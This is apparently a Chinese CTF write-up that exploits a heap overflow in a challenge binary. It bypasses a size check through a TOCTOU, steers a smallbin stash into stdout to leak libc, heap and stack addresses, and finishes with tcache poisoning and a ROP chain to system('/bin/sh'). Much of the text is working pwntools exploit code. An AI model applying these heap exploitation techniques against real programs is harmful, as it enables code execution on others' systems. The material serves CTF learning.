
![](https://bbs.kanxue.com/upload/attach/202606/1060264_GBYCZCP8CKKPMXC.png)

`edit`中硬编码了写入长度，对0xc0大小的堆块做写入操作时存在0x20大小的堆溢出

![](https://bbs.kanxue.com/upload/attach/202606/1060264_7Z8QR2R9WY9UQPN.png)

同时，在`edit`时存在一个`check`逻辑，当读入长度大于0xD8时进行检查，首先取当前堆块+0xC8位置的数据，其实对于我们要进行堆溢出操作的0xC0堆块而言，这个位置就是下一个堆块的`size`，如果这个`size`在0x1F与0x520之间，且没有通过`times`函数中的检查，就会直接退出程序，我们跟进`times`看看

![](https://bbs.kanxue.com/upload/attach/202606/1060264_RP9W8DF4P56EXPM.png)

传入的参数是当前堆块+0xD8的位置，对于0xC0的堆块而言，就是下一个堆块的`bk`位置，首先先获取当前堆的堆顶，如果该位置不为0，且`heap_base`已被初始化，就会检查这个`bk`指针是否在堆内存范围内，如果不在的话，该函数的检查就失败

![](https://bbs.kanxue.com/upload/attach/202606/1060264_6TMWHB9GA3HAABA.png)

所以，如果我们按照上述函数方法试图修改smallbin的`bk`指针时，就会遇到该函数的阻碍，但是想要绕过也非常非常简单，其实这里严格来说存在一个TOCTOU的漏洞，也就是我们在堆溢出时先将`size`位改为一个大于边界的数，因为是先进行的写入操作，所以在检查时根本不需要通过`times`的检查也能够正常返回菜单，而这样做会使得堆内存被打乱，此时我们只需要再次通过堆溢出再次覆写`size`为原`size`，这样的写入操作不超过0xD8字节，因此也不会进入检查，我们就能够在绕过检查的方式下修改smallbin的`bk`指针了。

![](https://bbs.kanxue.com/upload/attach/202606/1060264_HEJZZ5BBAEX9C73.png)

接下来我们对这道题进行上述方法的利用，首先我们先需要填满tcache并在smallbin中链入7个堆块（注意，每个堆块间应有用来分隔的堆块，否则会触发unsortedbin的合并机制）

```python
for i in range(7): #tcache
    add(i, 2)

for i in range(6):
    add(i + 7, 2)
    add(14, 1) #防止合并，并且在结束循环时idx14就是我们将进行堆溢出的堆块

add(13, 2) #链表头就是这个堆块
add(15, 1) #防止与topchunk合并

for i in range(7):
    delete(i) #填满tcache
add(4, 1) #这三个堆块是用来后续利用tcache进行任意地址分配的，可以先不管他们
add(5, 1)
add(6, 1)
for i in range(7):
    delete(i + 7) #链入smallbin
```

我们来看此时的内存，我们恰好可以通过链表头前的堆块溢出覆写链表头的这个smallbin的低字节，将其改为IO中的地址

![](https://bbs.kanxue.com/upload/attach/202606/1060264_3PRFKCEUUYJGTXW.png)

此时我们覆写，并且将tache的堆块都先申请出来，再申请一个堆块触发stash，查看情况

```python
edit(14, b"a" * 0xC0 + p64(0) + p64(0x550) + p64(0) + b"\x50\x45")
edit(14, b"a" * 0xC0 + p64(0) + p64(0x101)) #上述提到的绕过检查的方法

for i in range(7):
    add(0, 2) #tcache
add(0, 2) #触发stash
```

可以看到，我们想要申请的地址已经进入了tcache，我们只需要再进行一次`malloc`就实现了申请到IO，但与此同时值得注意的是，smallbin中的链表已经被我们破坏了（bin的`fd`依然指向我们利用的堆块），也就意味着我们无法在tcache填满后对这个`size`进行申请，会触发双向链表检查报错

![](https://bbs.kanxue.com/upload/attach/202606/1060264_J63T58PVX8U3747.png)

我们再修改`stdout`的字段，使得我们能拿到原本在`_IO_buf_end`的地址，从而计算`libc`的基地址

```python
add(1, 2)
edit(1, p64(0) * 12 + p64(0xFBAD1887) + p64(0) * 3 + b"\x00")
rc(20)
libc_base = uu64(rc(6)) - 0x204644
slog(b"libc", libc_base)
```

![](https://bbs.kanxue.com/upload/attach/202606/1060264_9MWZKSB9APPUVDJ.png)

那么此时，我们通过控制`stdout`的字段就能实现任意地址读写，我们可以通过读`main_arena`拿到堆基址、读`environ`拿到栈地址

```python
def show(addr, size):
    payload = (
        p64(0) * 12
        + p64(0xFBAD1887)
        + p64(0) * 3
        + p64(addr)
        + p64(addr + size)
        + p64(addr + size)
    )
    edit(1, payload)
    rc(20)

show(libc_base + 0x203B20, 6)
heap_base = uu64(rc(6)) - 0x1B50 - 0x1A0 - 0xD0
slog(b"heap", heap_base)
show(libc_base + 0x20AD58, 6)
environ = uu64(rc(6))
slog(b"stack", environ)
```

![](https://bbs.kanxue.com/upload/attach/202606/1060264_BFD6K6DWG8HSJV7.png)

那么我们拥有堆、栈、`libc`地址后，就可以通过tcache_poisoning直接劫持返回地址控制执行流了，但是由于上述所说的原因，我们没有办法从smallbin中再取对应`size`的堆块，所以我们提前布置好就好。

```python
delete(4)
delete(6)
chunk = heap_base + 0x1710
edit(
    5,
    b"/bin/sh\x00"
    + b"a" * 0xB8
    + p64(0)
    + p64(0xD1)
    + p64(safe(chunk, environ - 0x178)) #safe-linking
    + p64(0),
)
slog("ret", environ - 0x128)
add(6, 1)
add(4, 1)
bin_sh = heap_base + 0x1720
pop_rdi = libc_base + 0x10F75B
edit(
    4,
    p64(0)
    + p64(1)
    + p64(2)
    + p64(pop_rdi + 1)
    + p64(pop_rdi)
    + p64(bin_sh)
    + p64(libc_base + libc.sym["system"]),
)
sh()
```
